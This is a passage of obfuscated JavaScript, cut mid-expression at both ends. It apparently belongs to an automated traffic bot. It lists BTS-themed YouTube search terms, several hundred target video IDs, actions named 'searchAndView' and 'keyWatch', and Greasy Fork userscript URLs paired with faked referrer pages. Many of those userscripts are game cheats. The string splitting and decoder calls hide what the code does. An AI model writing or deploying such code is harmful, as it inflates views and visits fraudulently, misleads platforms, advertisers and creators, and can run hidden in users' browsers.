+ '語字幕最新,taeh' + 'yung\x20bts,j' + 'ungkook\x20bt' + 's,bts\x20reac' + 'tion,bts\x20s' + 'truggle,bt' + 's\x20marriage' + ',bts\x20jungk' + 'ook,bts\x20面白' + 'い\x20日本語字幕,bt' + 's\x20playlist' + ',bts\x20play\x20' + 'game,bts\x20n' + W(0x18) + 'ts\x20news\x20to' + 'day,bts\x20in' + 'terview')['split'](',')), searchTerms = searchTerms['flat'](0x1cf * 0x11 + 0x1353 * -0x2 + -0x1 * -0x7ea);
const hookPlaylistPoints = [
    'eHpl-BjXo5' + '8',
    '-PgyODlV6V' + '8',
    'S9EkXX0QYD' + 'U',
    'WvcG1OKdHW' + 'o',
    'b6gOcEwtZ8' + 'U',
    'apdtzA0Dzf' + 'k',
    'YiukDwYv2K' + '4',
    'zK-6UH5R5X' + '8',
    'bIXqNjtsEf' + '4',
    '3l253rESkw' + 'Q',
    'u6RVZKcN9z' + 'Q',
    '6ImZdwpdwT' + 'A',
    '0qPB5ANSBK' + 'c',
    '92duH3cqn1' + 'M',
    'b5lKI78fw3' + 's',
    'zpCCPZfP8L' + 'I',
    'ES7oooakr-' + 'c',
    '2eWyJ8FBvQ' + '8',
    'O4-B3OFPDf' + 'Q',
    'JFcnGk0_u7' + 'o',
    'AP7d2Ghq6d' + 'U',
    'UizEAwrZAG' + 'I',
    '0FAi5-h8Hj' + '0',
    'CNqA6IYj17' + 'k',
    'tSiKyCpwnS' + 'Y',
    'OrglyeV5xP' + 'Y',
    'BXkB-g4eCc' + 's',
    'Y53CmmpbOJ' + 's',
    'sm5MLz_IrQ' + 'k',
    'EuciRU_Ska' + '0',
    'cCbDCTLyPc' + 'E',
    'Ox7Ng5T7bm' + 'c',
    'TXTaB-dQg-' + '0',
    '3jSWaWgr_A' + '0',
    'xT8nvuxCRB' + 'E',
    '3c4Ab9EmRg' + 'Y',
    '2kScgeNOpL' + '8',
    't22jhowMom' + 'c',
    'HbcDLgkmXL' + 's',
    'JsKZ41uTeg' + 'c',
    'dfU48FRgs0' + 'g',
    '3K9ILewnUk' + 'o',
    'QmKwnRiKhD' + 'k',
    'n3nVsWsL6I' + 'k',
    'noTs52D_Mw' + 'Y',
    'A0tDR4nTTK' + '0',
    '9eBwFca-B1' + '4',
    'moasU30H5l' + 'A',
    '_Mb8oQtSBW' + 'E',
    'TNGGOgwPtc' + 'M',
    '-pYA-gjkQ8' + 's',
    '5d-dB6tZZA' + 'o',
    '8H2AiOV0oE' + 'o',
    'mI7aiKDGde' + 'w',
    'D-IMDYrj35' + '4',
    'gKgFiEgghy' + 'g',
    'mjVwfjJ2nj' + 'k',
    '6auDBi-D2H' + 'M',
    'X89-SWNdIE' + 'k',
    'T5Pn4LhIwj' + 'M',
    'wVnKGSjY3i' + '8',
    'g11NJftxw1' + '4',
    '9zHirkfEKk' + 'k',
    'ZyGS_AMbIa' + '4',
    'yG6bwB17ZP' + 's',
    'aytHiLe0s6' + 'U',
    'cGe-Mpw_F1' + 'w',
    'eMK7xV_nxZ' + 'o',
    'epJ2MAKa1Y' + 'Q',
    '5BNbKKMUhE' + 'o',
    'oxpAvc6tDP' + '8',
    'jRcc-NIR2R' + 'I',
    '258btO4mFw' + '4',
    'pXjJAUvSbQ' + 'A',
    '63-irfPjh2' + 'c',
    'xbrDZAFf3Q' + 's',
    'MVHMtRlesU' + 'g',
    'zed05qfHMB' + 'I',
    'nkhkxKUHsY' + 'g',
    'n4cSAqR9H1' + 'Q',
    'gOUPndcj7z' + 'I',
    'n3HBTTDHoX' + '8',
    'XIgMFHPIXv' + '4',
    'oQHKMky-_K' + 'c',
    'zfDgTzZ2nh' + '0',
    '1PYettRo-D' + 'M',
    'jzuZuwF490' + '4',
    '2DAgWTlXae' + '8',
    'keouUYA5hI' + 'k',
    'F7i7wRlGCd' + 'c',
    'uToD2c0CdJ' + 'c',
    'Y8DzpdFZZ8' + '8',
    '-rrH657DAa' + 'o',
    'QTrEEWtDks' + '4',
    'TWTSnQDuad' + 'Y',
    'a0GUyvgnzg' + 'c',
    'eSReWZQyKd' + 'E',
    'D_5pMqdKSs' + '4',
    'm0ie8gHS00' + 'I',
    '6WosqMq9ej' + 'o',
    'i0afAOlon_' + '4',
    'j_fe6PfxW4' + 'Y',
    'GfPzi8SYr0' + 'w',
    'MSgZhNCwff' + 'M',
    'wxyBC_z6bI' + '8',
    'PkQpV-Fwhs' + 'k',
    'bVD6cWOVhN' + 'U',
    'mjZOpQlHbx' + 'M',
    'k_BXkcdbBO' + 'M',
    'X72oUsFV7q' + '0',
    'lONsILfq-W' + 'Y',
    'Bhe9PyM_s_' + 'Q',
    'Bhe9PyM_s_' + 'Q',
    'h4TBnDkX4y' + 'o',
    'PNBJyHEkfk' + '4',
    'L3iHS__ufc' + 'g',
    'm7aliUAwm_' + 'Y',
    'FuPVf85zMi' + 'w',
    'gtupAeNTDS' + 'M',
    'yyJ8zkckoB' + '8',
    'ZDTESiN1eS' + 'w',
    'Fo6x16DkoR' + 'o',
    'IAJqRxhVqO' + 'k',
    'KAgwII8TGj' + 'o',
    'o4tLCshmlb' + 'M',
    'dLj5fIupdA' + 'o',
    '_Xl_-b9P4U' + 'Q',
    'V3NxxpUUfW' + 'E',
    'J3ygeDEMnO' + 'w',
    'HcP_xmdwsl' + 'c',
    'M9g0h7px2_' + 'M',
    'b5WfUvcSgr' + 'U',
    'JGHnIshsoC' + 'E',
    'x2gfhCLHd9' + '4',
    'M5Fr8G0ma9' + 'o',
    '3sGeIBfFlC' + 'M',
    'k74y4KOJ2m' + '4',
    'pTHJB0S8E-' + 'U',
    'KaIrXJLfYP' + 'M',
    '0cisZkywhg' + 'Q',
    '0dVzItbl9E' + 'w',
    't0EqnhcSb1' + 's',
    'MuiXtvo1RY' + 'E',
    'Nj-3KC6knH' + 'w',
    'B19HbETNi5' + '8',
    'yKN_QkroH6' + 's',
    'U9ExFM1pji' + '0',
    'sONzDfjKhL' + '4',
    'n3Kj8zEfew' + 'U',
    'nXLGQ7QeoG' + 'Y',
    'OQFQiwiM-P' + 'Y',
    'UtPRpKRTtH' + 'U',
    'E56Myp0BzE' + 'E',
    '7DjOp_JM2Z' + 'w',
    'rNFLQFz_G1' + 'g',
    '1r2pKoVAdj' + 'M',
    'gm3eiv6UND' + 'M',
    'yOiROfjxzX' + 'o',
    'lt2AcxC_ap' + 'g',
    'bObEme2BDO' + 'E',
    '6Ut6HbJmW4' + 'w',
    'fUs0TtQQTo' + '0',
    '_phHS3FAgW' + 'Q',
    '1f8sU4l3dP' + '4',
    'HwTSLUd53K' + '8',
    'EpP2ymD_QG' + 'A',
    'TQ69QFqmbo' + 'I',
    'wA8BqUka_u' + '0',
    'bc8Ey-vuR5' + 'M',
    'PZ_uLi7ULl' + '0',
    'smu5FsnhwF' + '4',
    'dv1JluwoOb' + 'c',
    'nHotP0jbcv' + 'A',
    'iIjYNEmrVv' + 'M',
    'SeP-OZAiPb' + 'c',
    'v52PClvMFt' + 'k',
    '3loLqIPxTS' + '0',
    'jVu9mOzbSq' + 'U',
    '73SAN1vOrV' + 'k',
    'YLPxp4ntym' + 's',
    'YWXfelRk3b' + 'Q',
    'CsxlLMb6Uj' + 'o',
    'uafGOfwzpa' + 'Q',
    'XIr8qotHOI' + 'E',
    'EcoPCWC3Uh' + 'o',
    'AhOwyT8aIh' + 'g',
    't-Ox7lI5UH' + 's',
    'i08qNmssXe' + 'Q',
    'QrJIU09eD-' + 'g',
    'QvNNCQ-8Rp' + 'E',
    'k5gjnjDFAZ' + 's',
    'h_NQ3y1ek8' + 'U',
    'evPsJlNLy_' + '4',
    'qEPTydgwh4' + 's',
    'LB685ckhuf' + 'E',
    'Lj1EcSMGey' + '0',
    'OE19r7MIMW' + 'Q',
    'u8E3p0Vy-P' + 'Y',
    'f4a5OPFQa7' + 'k',
    'XDo7Q7yUEt' + 'k',
    'Vw_9zw0qHI' + 'c',
    'KGT5nbDsI_' + '8',
    'E008Eql59M' + 'Q',
    'wSOFdefX47' + 'A',
    '2xcv7q3QhR' + 'E',
    'hgfvmcBkc0' + '4',
    '0wP7csnX7k' + '4',
    'Xo0R8WiRSb' + '4',
    '8zNp8EOpGd' + '4',
    'sWYhIJZmoS' + 'E',
    'YdG8U1W-bX' + '0',
    'QeDsoSNml-' + 'c',
    'xW5q77El0x' + '8',
    'ZF14issJFE' + 'Y',
    'TRglEGLLKX' + 'o',
    'UE0SXc5k1e' + 'g',
    '6VY65D8f3D' + 'Q',
    'Iwxuob4fA8' + 'Q',
    'M4elJHCUIi' + 's',
    'GY9WWhO504' + 'k',
    'eErUSxmLDw' + '8',
    'ITQfAfzLj3' + 'I',
    'vbDrCL2FuL' + 'g',
    'KyQ_sUgtbK' + 'U',
    'lbEJcipUp8' + 'I',
    '2SqCn2LreN' + 'g',
    '1i-G2TUn41' + '0',
    's0ru6uK7vi' + '8',
    'gOxiE5UAAD' + 'w',
    'lx1rOOjekc' + '8',
    '5VYN2zA-Si' + 'k',
    'q9rLWEAzoo' + 'k',
    '4KSm3IY7Xz' + 'g',
    'fMqRu_ON-D' + 'E',
    'GfvShU6Sy9' + 'A',
    'OHzOmi1b60' + 'Y',
    'D9oTUKT-_n' + 'A',
    '_BrT2PlUiw' + '0',
    'kuuI4LzKgm' + 'I',
    '78dymyg88r' + 'M',
    'mi0nGt2B-q' + 'o',
    'HaI7BjnwnO' + 'c',
    'xlAEOkIuy7' + 'Y',
    '3VmtckvTXl' + 'U',
    'ed7TWHKDr4' + 'E',
    '2LfTjyVtbf' + 'U',
    'STHlCkloyv' + 'E',
    '-BI_-6YnM6' + 'Y',
    'LSK_G1qCQw' + 'M',
    '4tzqIl6EKV' + 'k',
    '9DshU55EiV' + '8',
    'mBtaEI_6e8' + 's',
    '960lvuduwY' + 'w',
    'XWJH-6J5Ee' + 'g',
    'XLS4qmyCAX' + 'g',
    '8cJDYeRiLn' + 'k',
    'cCaIVrltHz' + 'w',
    '8X2fF4pgM0' + 'E',
    '6s8Xm4wylr' + '4',
    'eFceshvavn' + 'o',
    '2h4g7euqR-' + 'U',
    'ujiBqXnn92' + '8',
    'w9F2NST-9j' + 's',
    'w-oc7F5Mmy' + 'U',
    'UYrmqL3cOD' + 'U',
    '4QB59etj0I' + 'o',
    'MY9MTNgXcN' + 'o',
    'ISBmcKDS5C' + '8',
    'ogIb7A7tvW' + '0',
    '-L583IZF6s' + 'k',
    'NbeKQq29ZL' + '0',
    'SPplDxd74F' + 's',
    'MHGV8QmpAz' + 'k',
    'iWzezFWpU7' + 'A',
    'NNCQt1rXXE' + 'Y',
    'bcb_ZhJJK8' + 'g',
    '3KoZGQiY6N' + 'o',
    'aSaXQH8F1_' + 'A',
    'V5nMOhI62o' + 'w',
    'JvlPjRUdId' + '0',
    '2gQHuClLCb' + '0',
    '5e-qDy-uUJ' + 'E',
    'oE8vC0QEWU' + 'E',
    '7cQken99yu' + 'o',
    'pmzu080j7r' + 'I',
    'sVy9F4whP6' + 'o',
    'MJrkylk7iE' + 'c',
    'XYjsTxi6oE' + '8',
    'mKlMouB6tp' + '0',
    'o2yunZQley' + 'A',
    'oRryU9F9Lv' + 's',
    'uzzK-052H0' + 'c',
    'VSvA4rCe-4' + 'M',
    'XURH2u_0fM' + 'I',
    'yfpVL2g_tk' + 'o',
    'AuEEjQ8x9o' + 'w',
    'wWkviY8zBr' + 'c',
    'zt_eubHWhx' + 'c',
    'O_7_BGU3u_' + '0',
    'QFDKBxmOn3' + 'Y',
    'w6gccNWXXv' + 'g',
    'VdNJxbrqdX' + 's',
    'wbi5Dxebvn' + 'I',
    X(0xb) + 'k',
    'I2rcRta7WJ' + '0',
    'OP5KGfXHX_' + 'A',
    'w2MUMbbwlm' + 'o',
    'X3bF0nd6kf' + 'w',
    'WDDAhASf9j' + 'w',
    'fRwcV8gjbc' + 'w',
    '7T63gaRThr' + '0',
    'zC8AWIwhbf' + 's',
    'JSkVE0n-ee' + 'o',
    'qiQA5pWWRt' + 'U',
    'QdXCjZtfXu' + 'c',
    'vlBji8TOax' + 'o',
    'pBx_5CbIcp' + 'o',
    'L1Oy5F6ZMO' + 'Q',
    'P0NjLaBed-' + 'E',
    'DR16C4-keB' + '0',
    'LGmpIpu9eD' + 'w',
    'rNkX_A4kBA' + 'Q',
    'QztVMjrEk4' + '0',
    'uOM6m6KL5d' + '4',
    'g-Aju8xrrO' + 'E',
    'DfkDbFk_x9' + '8',
    'Y4NLDaowD6' + 'I',
    'ALSZnqQTuJ' + 'o',
    'xUmB6BpZBE' + 'w',
    'SxNOcZ1s85' + '8',
    '-noeCjO416' + 'k',
    'taPJqXBI8V' + 'Y',
    'YxqbkMi1Is' + '4',
    'vnJTyve2r-' + '4',
    '44lRVYQ38E' + 'Q',
    'QOv1N1X5J-' + 'g',
    'jNjREs7ODT' + 'g',
    'U30ToJo3dd' + 'k',
    'rm7lNIIOQC' + 'Y',
    'mGU6sOPlYv' + 'c',
    '6pwxUXdt6T' + 'Q',
    '6MkJRee35a' + 'Q',
    'LVbf7U9WAI' + 'c',
    'gPbhFvEeJ3' + 'M',
    'LWXAxz0MiH' + 'A',
    'L0KQJqfwJJ' + 'Y',
    'GWr33_u0VK' + 'c',
    '4ud3ZPfWkH' + 's',
    'dxSrySC4XM' + 'c',
    'iIM2KZC69W' + '0',
    '8DuJ3BAwME' + 'o',
    'm3BAhe1wsl' + 'Y',
    '02U_3pAZxM' + '8',
    '0e7nidPa97' + 'g',
    'TixW__6Eer' + 'o',
    'q46W8MTRTC' + 'E',
    'Jdxp04Je1O' + 'w',
    'HfP4TO3gfN' + '0',
    '4dUJaeB0qL' + '8',
    'xnL-fRJ3RZ' + 'o',
    'yJbD0Df45u' + 'Q',
    '-pGw8RkSSB' + 'k',
    '7cy86Njsis' + 'M',
    'jbgqvxtauo' + '4',
    'N8M00JjSVI' + 'I',
    'MfR5q6Td3R' + 'c',
    'eHwcx94wcp' + 's',
    'olDgVFgAgP' + 'o',
    'eAAd5BmzXz' + 'M',
    'xgTjQ2sGXd' + '4',
    'ipny6JUbzw' + 's',
    'WOwQ0UxbRj' + '4',
    'h0PKFed2GB' + 's',
    'JxdOrgzq7Z' + '8',
    '-VgpSWWW-8' + 'w',
    '-ix4OizkAn' + 's',
    'd3CRE9y3YV' + 's',
    '4QZlfXxorJ' + 'o',
    'YlDpg8aCs5' + 'M',
    'Qe5WT22-AO' + '8',
    'b_rjBWmc1i' + 'Q',
    '9yjZpBq1XB' + 'E',
    'hPx-RiBKXt' + 'Q',
    'UMqLDhl8PX' + 'w',
    'DlJEt2KU33' + 'I',
    'BWeqoARup-' + 'Q',
    '2Dx76lD8Sc' + 'c',
    'j_nI6G3ZDi' + 'E',
    'zvcUYYN1sx' + 'w',
    'cWRkYo1S3L' + '4',
    'cWRkYo1S3L' + '4',
    'bxC_PN3SRv' + 'I',
    '94m93T_5JL' + 'M',
    'RBSHAH4iWU' + '8',
    'RBSHAH4iWU' + '8',
    'RBSHAH4iWU' + '8',
    'bo9fTeXvSi' + 'A',
    'z6LqXiAK-8' + '0',
    '5tbOspjJ5f' + '0',
    'twQ6kKjtBk' + 'Y',
    'Ig17K38Fy0' + 'Y',
    'ZdlrVDwn_a' + '4',
    'aCT4Lddunx' + 'g',
    'acAvMGQtln' + 'M',
    '8XkcbdSRdO' + '0',
    '0e3GPea1Ty' + 'g',
    'zxYjTTXc-J' + '8',
    '9bqk6ZUsKy' + 'A',
    'plSyrHqUh7' + '8',
    'HkvQywg_uZ' + 'A',
    'lADBHDg-Jt' + 'A',
    'I2O7blSSzp' + 'I',
    'kd2KEHvK-q' + '8',
    'CbUjuwhQPK' + 's',
    'fb7T1v_VHp' + 'E',
    'SpeSpA3e56' + 'A',
    'RQdxHi4_Pv' + 'c',
    'nx2-4l4s4N' + 'w',
    'tUTCq3iiw_' + '4',
    'VDa5iGiPgG' + 's',
    'S-sJp1FfG7' + 'Q',
    'Hm1YFszJWb' + 'Q'
  ],
  GlobalActions = [
    searchAndView,
    anchorAndView,
    frontScreenActions,
    keyWatch
  ],
  wait = f => new Promise(h => setTimeout(h, f)),
  scriptTargets = [{
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/457024' + '-surviv-io' + '-xclient-b' + 'eta',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/surviv.i' + 'o'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/404065' + '-%E7%BD%91' + '%E9%A1%B5%' + 'E7%B2%BE%E' + '7%81%B5',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/51cto.co' + 'm'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/22545-' + 'anti-bd-re' + 'direct',
      'preRef': W(0x0) + 'easyfork.o' + 'rg/zn-CN/s' + 'cripts/by-' + 'site/baidu' + '.com?page=' + '4'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/zn-CN/s' + 'cripts/385' + '044-zhihu-' + 'anonymous-' + 'users',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/zn-CN/s' + 'cripts/by-' + 'site/zhihu' + '.com'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/zn-CN/s' + 'cripts/302' + '36-zhihu-l' + 'ink-fix',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/zn-CN/s' + 'cripts/by-' + 'site/zhihu' + '.com'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/435948' + '-btb',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/baidu.co' + 'm'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/430335' + '-wb-script',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/zhihu.co' + 'm'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/430572' + '-beautify-' + 'the-baidu-' + 'homepage',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/zhihu.co' + 'm'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/410781' + '-diep-io-a' + 'nti-afk-ti' + 'meout',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/diep.io'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/1196-v' + 'iew-youtub' + 'e-tags',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/21012-' + 'youtubeext',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/20798-' + 'youtube-hi' + 'de-volume-' + 'control',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/9090-y' + 'outube-add' + '-video-id-' + 'text-field',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/20710-' + 'calm-down-' + 'youtube',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + X(0x16) + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/39544-' + 'youtube-po' + 'lymer-disa' + 'ble',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/412698' + '-youtube-a' + 'uto-skip-a' + 'ds',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/413965' + '-youtube-l' + 'ike-dislik' + 'e-video-an' + 'd-skip-ad-' + 'keyboard-s' + 'hortcuts-f' + 'ork-from-n' + 'erevar009',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/39919-' + 'youtube-su' + 'ggested-vi' + 'deo-hider-' + 'for-youtub' + 'e-classic',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + X(0x13) + '-requestho' + 'ok',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/414876' + '-live-chat' + '-mod-calib' + 'er',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/40462-' + 'youtube-no' + '-resume',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/40517-' + 'youtube-re' + 'sume',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/415706' + '-moomoo-io' + '-remove-co' + 'okie-prefe' + 'rences-tab',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/moomoo.i' + 'o'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/405955' + '-web-secur' + 'ity',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/*'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/381682' + '-html5%E8%' + 'A7%86%E9%A' + '2%91%E6%92' + '%AD%E6%94%' + 'BE%E5%99%A' + '8%E5%A2%9E' + '%E5%BC%BA%' + 'E8%84%9A%E' + W(0xe),
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/*'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/429635' + '-always-on' + '-focus',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/*'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/30310-' + 'removeads',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/*'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/455853' + '-%E7%BD%91' + '%E9%A1%B5%' + 'E8%AE%BF%E' + '9%97%AE%E5' + '%8A%A0%E9%' + '80%9F%E5%9' + '9%A8',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/*'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/454941' + '-hcaptcha-' + 'captcha-so' + 'lver-by-no' + 'captchaai',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/*'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/374794' + '-lift-web-' + 'restrictio' + 'ns-io-game' + '-mods-moom' + 'oo-io-krun' + 'ker-io-ad-' + 'link-bypas' + 'ser-adbloc' + 'k-more',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/baidu.co' + 'm'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/374794' + '-lift-web-' + 'restrictio' + 'ns-io-game' + '-mods-moom' + 'oo-io-krun' + 'ker-io-ad-' + 'link-bypas' + 'ser-adbloc' + 'k-more',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/moomoo.i' + 'o'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/374794' + '-lift-web-' + 'restrictio' + 'ns-io-game' + '-mods-moom' + 'oo-io-krun' + 'ker-io-ad-' + 'link-bypas' + 'ser-adbloc' + 'k-more',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/discord.' + 'com'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/407994' + '-mope-io-a' + 'uto-dive-a' + 'uto-boost-' + 'see-people' + '-underwate' + 'r-see-invi' + 'sible-play' + 'ers-remove' + '-ads',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/mope.io'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/424066' + '-pancake-m' + 'od-katana-' + 'musket-aut' + 'oheal-anti' + '-insta-sta' + 'rter-resou' + 'rces-and-m' + 'ore',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/moomoo.i' + 'o'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/429746' + '-best-moom' + 'oo-io-hack' + '-mod-2022-' + '2023',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/moomoo.i' + 'o'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/405943' + '-moomoo-io' + '-agar-io-s' + 'urviv-io-s' + 'lither-io-' + 'diep-io-gl' + 'obal-name-' + 'manager-kr' + 'unker-comi' + 'ng-soon',
      'preRef': 'https://gr' + 'easyfork.o' + W(0xd) + 'pts/by-sit' + 'e/moomoo.i' + 'o'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/456855' + '-anti-anti' + '-adblock-v' + '1-all-site' + 's',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/*'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/454134' + '-moomoo-io' + '-dune-mod-' + 'autoheal-a' + 'utobreak-f' + 'ast-and-mo' + 're',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/moomoo.i' + 'o'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/424447' + '-xtaming-c' + 'lient-tami' + 'ng-io-hack' + 's',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/taming.i' + 'o'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/451547' + '-moomoo-io' + '-insane-mo' + 'd-beta-too' + '-fast-read' + '-descripti' + 'on',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/moomoo.i' + 'o'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/424655' + '-i30cps-ut' + 'ility-mod',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/moomoo.i' + 'o'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/448601' + '-%E5%8A%9B' + '%E6%89%A3%' + 'E9%A2%98%E' + '7%9B%AE%E8' + '%BD%ACmark' + 'down',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/leetcode' + '.cn'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/445806' + '-moomoo-io' + '-auto-heal',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/moomoo.i' + 'o'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/434199' + '-moomoo-io' + '-helper-to' + '-become-pr' + 'o',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/moomoo.i' + 'o'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/405943' + '-moomoo-io' + '-agar-io-s' + 'urviv-io-s' + 'lither-io-' + 'diep-io-gl' + 'obal-name-' + 'manager-kr' + 'unker-comi' + 'ng-soon',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/slither.' + 'io'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/454409' + '-video-dow' + 'nloader-fo' + 'r-tampermo' + 'nkey',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/*'
    },
    {
